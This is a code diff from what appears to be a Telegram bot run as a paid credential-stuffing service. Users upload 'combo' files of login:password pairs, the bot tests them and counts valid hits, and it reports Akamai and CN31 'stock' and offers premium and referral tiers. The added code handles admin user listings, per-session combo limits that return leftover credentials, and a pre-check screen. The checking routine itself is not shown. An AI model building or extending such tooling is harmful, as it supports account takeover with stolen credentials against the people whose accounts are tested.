+            except Exception:
+                pass
+            exp_str = ""
+            if prem and u.get("premium_expires"):
+                try:
+                    exp_str = " until " + datetime.fromisoformat(u["premium_expires"]).strftime("%m/%d")
+                except Exception:
+                    pass
+            lines.append(f"<b>@{name}</b>  <code>{u['uid']}</code>")
+            lines.append(f"  [{tag}{exp_str}]")
+            lines.append(f"  Checked: <b>{chk:,}</b>  Valid: <b>{val:,}</b>")
+            lines.append(f"  Refs: <b>{refs}</b>  Ref pts: <b>{ref_pts}</b>  Ban: <b>{ban_c}</b>")
+            lines.append(f"  Joined: {joined}")
+            lines.append(f"{sep2_u}")
+
+        nav_row = []
+        if page > 0:
+            nav_row.append(InlineKeyboardButton(
+                "< PREV", callback_data=f"admin_users_page_{page - 1}"))
+        if end < total_u:
+            nav_row.append(InlineKeyboardButton(
+                "NEXT >", callback_data=f"admin_users_page_{page + 1}"))
+
+        rows = []
+        if nav_row:
+            rows.append(nav_row)
+        rows.append([InlineKeyboardButton("[ BACK ]", callback_data="admin_panel")])
+
+        await query.edit_message_text(
+            "\n".join(lines),
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(rows)
+        )
         return ConversationHandler.END
 
     if data == "admin_premium":
@@ -3150,6 +3563,30 @@ async def receive_check_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return ConversationHandler.END
 
     total_raw = len(combos)
+    leftover  = []
+
+    if total_raw > MAX_COMBO_LINES:
+        leftover = combos[MAX_COMBO_LINES:]
+        combos   = combos[:MAX_COMBO_LINES]
+        total_raw = len(combos)
+
+        leftover_text = "\n".join(f"{lo}:{pw}" for lo, pw in leftover)
+        leftover_buf  = io.BytesIO(leftover_text.encode("utf-8"))
+        leftover_buf.name = "leftover_combos.txt"
+        await update.message.reply_document(
+            document=leftover_buf,
+            caption=(
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"  <b>LEFTOVER COMBOS</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"Your file had <b>{total_raw + len(leftover):,}</b> combos.\n"
+                f"Limit per session: <b>{MAX_COMBO_LINES:,}</b>\n\n"
+                f"First <b>{MAX_COMBO_LINES:,}</b> will be checked now.\n"
+                f"Remaining <b>{len(leftover):,}</b> are returned here.\n\n"
+                f"Send this file again to check the rest."
+            ),
+            parse_mode="HTML"
+        )
 
     if not prem:
         with data_lock:
@@ -3187,18 +3624,53 @@ async def receive_check_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     context.user_data[f"scan_prem_{scan_key}"] = prem
     context.user_data[f"scan_chat_{scan_key}"] = chat_id
 
+    ak_pool, cn_pool, ak_ok, cn_ok = fetch_stock_summary()
+
+    sep_s  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+    sep2_s = "────────────────────────"
+
+    ak_status = f"ONLINE — {ak_pool} stock" if ak_ok else f"LOW / OFFLINE — {ak_pool}"
+    cn_status = f"ONLINE — {cn_pool} stock" if cn_ok else f"LOW / OFFLINE — {cn_pool}"
+    ak_icon   = "" if ak_ok else ""
+    cn_icon   = "" if cn_ok else ""
+
+    stock_note = ""
+    if not ak_ok or not cn_ok:
+        stock_note = (
+            f"\n{sep2_s}\n"
+            f"  <b>LOW STOCK WARNING</b>\n"
+            f"  Some accounts may return as\n"
+            f"  INVALID or ERROR during this run.\n"
+            f"  Wait for stock to refill before\n"
+            f"  sending large combos.\n"
+            f"{sep2_s}\n"
+        )
+
     kb_scan = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Yes, scan & remove duplicates", callback_data=f"prescan_yes_{scan_key}")],
-        [InlineKeyboardButton("No, check all of them", callback_data=f"prescan_no_{scan_key}")],
+        [InlineKeyboardButton("[ YES — SCAN & REMOVE DUPES ]", callback_data=f"prescan_yes_{scan_key}")],
+        [InlineKeyboardButton("[ NO — CHECK ALL ]",            callback_data=f"prescan_no_{scan_key}")],
+        [InlineKeyboardButton("[ WHY AM I GETTING ERRORS? ]",  callback_data="error_guide")],
     ])
+
     await status_msg.edit_text(
-        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{sep_s}\n"
         f"  <b>FILE LOADED</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Combos loaded: <b>{total_raw:,}</b>\n"
-        f"Accounts in database: <b>{db_count:,}</b>\n\n"
-        f"Do you want to scan your combo against the database first?\n\n"
-        f"If yes, accounts already in the database will be removed from your list and sent back to you separately, then the remaining ones will be checked.",
+        f"{sep_s}\n\n"
+        f"Combos loaded:  <b>{total_raw:,}</b>\n"
+        f"Session limit:  <b>{MAX_COMBO_LINES:,}</b>\n"
+        f"In database:    <b>{db_count:,}</b>\n\n"
+        f"{sep2_s}\n"
+        f"  <b>SERVER STOCK</b>\n"
+        f"{sep2_s}\n"
+        f"  {ak_icon} Akamai  {ak_status}\n"
+        f"  {cn_icon} CN31    {cn_status}\n"
+        f"{sep2_s}\n\n"
+        f"  1 CN31 = 1 account\n"
+        f"  1 Akamai = 5 accounts\n"
+        f"{stock_note}\n"
+        f"Scan combo against database first?\n"
+        f"Duplicates will be removed and\n"
+        f"returned to you as a separate file.",
         parse_mode="HTML",
         reply_markup=kb_scan
     )
